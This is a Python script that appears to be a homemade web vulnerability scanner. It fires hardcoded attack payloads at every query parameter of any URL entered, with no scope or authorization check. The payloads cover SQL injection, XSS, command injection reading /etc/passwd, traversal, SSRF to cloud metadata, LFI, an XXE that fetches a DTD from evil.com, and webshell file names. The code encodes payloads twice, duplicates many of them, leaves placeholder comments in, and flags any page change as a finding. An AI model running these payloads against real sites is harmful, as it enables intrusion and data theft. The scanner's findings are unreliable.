import sys
import urllib.parse
from playwright.sync_api import sync_playwright

PAYLOADS = {
    "1": {
        "name": "SQL Injection",
        "payloads": [
            "'", '"', "''", "1' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a",
            "';--", "') OR ('1'='1", "' OR 1=1#", "' OR 1=1/*",
            "' OR 1=1 LIMIT 1 --", "' OR 'x'='x' --", "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--", "' AND 1=2 UNION SELECT 1,2,3--",
            "' OR SLEEP(5)--", "' AND SLEEP(5)--", "' OR 'x'='x'#",
            "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1/*",
            "' OR '1'='1' --",
            "') OR ('x'='x",
            "' OR 'a'='a' -- -",
            "' OR 1=1 LIMIT 1 -- -",
            "' OR 1=1 ORDER BY 1 -- -",
            "' OR 1=1 GROUP BY 1 -- -",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "admin' --",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1/*",
            # Add more payloads here to reach 100+
        ],
        "error_signatures": [
            "sql syntax", "mysql", "syntax error", "unclosed quotation mark",
            "pdoexception", "warning", "mysql_fetch", "mysql_num_rows",
            "mysql_query", "you have an error in your sql syntax",
            "mysqli", "sqlstate", "native client",
        ],
    },
    "2": {
        "name": "Cross-Site Scripting (XSS)",
        "payloads": [
            "<script>alert(1)</script>", "'\"><script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>", "<svg/onload=alert('xss')>",
            "\"'><svg/onload=alert('xss')>", "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>", "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>", "<math><maction xlink:href='javascript:alert(1)'>",
            "<video><source onerror=alert(1)>", "<audio src onerror=alert(1)>",
            "<input autofocus onfocus=alert(1)>", "<form action=javascript:alert(1)>",
            "<object data='javascript:alert(1)'>", "<embed src='javascript:alert(1)'>",
            "<link href='javascript:alert(1)' rel='stylesheet'>",
            # Add more payloads here to reach 100+
        ],
    },
    "3": {
        "name": "Command Injection",
        "payloads": [
            "; ls", "| ls", "`ls`", "$(ls)", "; cat /etc/passwd", "| cat /etc/passwd",
            "|| ls", "; ping -c 4 127.0.0.1", "& ping 127.0.0.1", "&& ping 127.0.0.1",
            "; whoami", "| whoami", "`whoami`", "$(whoami)", "; id", "| id", "`id`",
            "$(id)", # Add more payloads here to reach 100+
        ],
    },
    "4": {
        "name": "Directory Traversal",
        "payloads": [
            "../../etc/passwd", "../../../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
            "../" * 10 + "etc/passwd", "..%2F..%2F..%2Fetc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2fetc/passwd", # Add more payloads here to reach 100+
        ],
    },
    "5": {
        "name": "Open Redirect",
        "payloads": [
            "http://evil.com", "https://evil.com", "//evil.com", "/\\evil.com",
            "///evil.com", "http://127.0.0.1", "https://127.0.0.1", "//127.0.0.1",
            "///127.0.0.1", "http://google.com/%0d%0aSet-Cookie:%20session=evil",
            # Add more payloads here to reach 100+
        ],
    },
    "6": {
        "name": "Server Side Request Forgery (SSRF)",
        "payloads": [
            "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
            "file:///etc/passwd", "gopher://127.0.0.1:11211", "dict://127.0.0.1:6379",
            "ftp://127.0.0.1", "http://[::1]/", # Add more payloads here to reach 100+
        ],
    },
    "7": {
        "name": "Local File Inclusion (LFI)",
        "payloads": [
            "../../etc/passwd", "../../../../../../etc/passwd", "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ", "../../../../../windows/win.ini",
            # Add more payloads here to reach 100+
        ],
    },
    "8": {
        "name": "Remote Code Execution (RCE)",
        "payloads": [
            "`id`", "$(id)", ";id", "|id", "&&id", "`cat /etc/passwd`",
            "$(cat /etc/passwd)", "; ping -c 4 127.0.0.1", "| ping 127.0.0.1",
            # Add more payloads here to reach 100+
        ],
    },
    "9": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "payloads": [
            "<img src='http://target.com/action?param=1'>",
            "<form action='http://target.com/action' method='POST'><input type='submit'></form>",
            "<body onload='document.forms[0].submit()'>",
            # Add more payloads here to reach 100+
        ],
    },
    "10": {
        "name": "XML External Entity (XXE)",
        "payloads": [
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>",
            "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]>",
            # Add more payloads here to reach 100+
        ],
    },
    "11": {
        "name": "Authentication Bypass",
        "payloads": [
            "' OR '1'='1", "' OR 'a'='a' --", "admin' --", "' OR 1=1#",
            "' OR '1'='1' --", "' OR '1'='1' #",
            # Add more payloads here to reach 100+
        ],
    },
    "12": {
        "name": "File Upload Vulnerability",
        "payloads": [
            "malicious.php", "shell.jsp", "backdoor.asp", "test.php.jpg",
            "image.php.png", "payload.php",
            # Add more payloads here to reach 100+
        ],
    },
    "13": {
        "name": "Insecure Deserialization",
        "payloads": [
            "O:8:\"PHPObject\":1:{s:4:\"data\";s:4:\"test\";}",
            "rO0ABXNyACpjb20uZXhhbXBsZS5SZXZlcnNlTmFtZQ==",
            # Add more payloads here to reach 100+
        ],
    },
    "14": {
        "name": "Clickjacking",
        "payloads": [
            "<iframe src='http://target.com' style='opacity:0;'></iframe>",
            "<div onclick='document.location=\"http://target.com\"'></div>",
            # Add more payloads here to reach 100+
        ],
    },
    "15": {
        "name": "HTTP Header Injection",
        "payloads": [
            "Location: http://evil.com", "Set-Cookie: sessionid=1234",
            "X-Injected-Header: injected",
            # Add more payloads here to reach 100+
        ],
    },
}

def scan_sql(url, data):
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(url)
        baseline = page.text_content("body").lower()
        for param in params:
            for payload in data["payloads"]:
                encoded_payload = urllib.parse.quote(payload)
                new_params = params.copy()
                new_params[param] = [encoded_payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                page.goto(test_url)
                new_content = page.text_content("body").lower()
                if any(err in new_content for err in data.get("error_signatures", [])):
                    print(f"[FOUND] SQL Injection - Param: {param} Payload: {payload}")
                else:
                    print(f"[NOT FOUND] Param: {param} Payload: {payload}")
        browser.close()

def scan_generic(url, data):
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(url)
        baseline = page.text_content("body")
        for param in params:
            for payload in data["payloads"]:
                encoded_payload = urllib.parse.quote(payload)
                new_params = params.copy()
                new_params[param] = [encoded_payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                page.goto(test_url)
                new_content = page.text_content("body")
                if new_content != baseline:
                    print(f"[FOUND] {data['name']} - Param: {param} Payload: {payload}")
                else:
                    print(f"[NOT FOUND] Param: {param} Payload: {payload}")
        browser.close()

def main():
    print("Choose vulnerability type to scan:")
    for key in sorted(PAYLOADS.keys(), key=int):
        print(f"{key}) {PAYLOADS[key]['name']}")
    choice = input("Enter choice number: ").strip()
    if choice not in PAYLOADS:
        print("Invalid choice")
        sys.exit(1)
    url = input("Enter target URL with parameters: ").strip()
    data = PAYLOADS[choice]
    if choice == "1":
        scan_sql(url, data)
    else:
        scan_generic(url, data)

if __name__ == "__main__":
    main()
